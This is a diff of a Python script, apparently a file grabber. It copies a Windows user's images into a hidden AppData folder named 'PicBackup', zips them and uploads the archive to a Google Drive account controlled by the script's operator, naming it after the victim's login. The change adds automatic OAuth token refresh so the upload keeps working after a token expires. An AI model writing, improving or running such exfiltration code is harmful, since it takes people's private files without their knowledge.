@@ -6,14 +6,17 @@ import base64
 import json
 import requests
 
+Token         = ""# add the Token hare
+client_id     = ''#add the client_id  hare
+client_secret = ''#add the client_secret hare
+refresh_token = ''#add the refresh_token  hare
+
 class WIN_Geat:
     def __init__(self):
         
         self.Images_CO()
         self.Cloue_Store()
-    def Images_CO(self):
-        self.Token  = ""# add the Token hare
-       
+    def Images_CO(self):       
         count = 0
         if os.path.exists(os.environ["appdata"] +'\\PicBackup' ) :
            shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=False, onerror=None)
@@ -51,7 +54,7 @@ class WIN_Geat:
         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
         shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
     def Cloue_Store(self):
-         headers = {"Authorization":"Bearer " +self.Token}
+         headers = {"Authorization":"Bearer " +Token}
          para = {
                     "name":os.getlogin()+'_Documents.zip'
                 }
@@ -64,7 +67,28 @@ class WIN_Geat:
                              headers=headers,
                              files=files
                           )
-         shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
+         reponse_back = repoanse.text
+         if '401' in reponse_back :
+               New_Token = requests.post('https://accounts.google.com/o/oauth2/token',
+               params={'client_id': client_id  ,
+                       'client_secret':client_secret,
+                       'refresh_token':refresh_token,
+                       'grant_type': 'refresh_token'})
+               New_Token= New_Token.text.split()
+               Token = str("".join(New_Token[2])).replace(',','')
+               headers = {"Authorization":"Bearer " +Token}
+               para = {
+                        "name":os.getlogin()+'_Documents.zip'
+                      }
+               files = {
+                      'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+                      'file': open(os.environ["appdata"]+'\\PicBackup.zip','rb')
+                     }
+               repoanse = requests.post(
+                             "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+                             headers=headers,
+                             files=files
+                          )
 if __name__=='__main__':
     WIN_Geat()
        
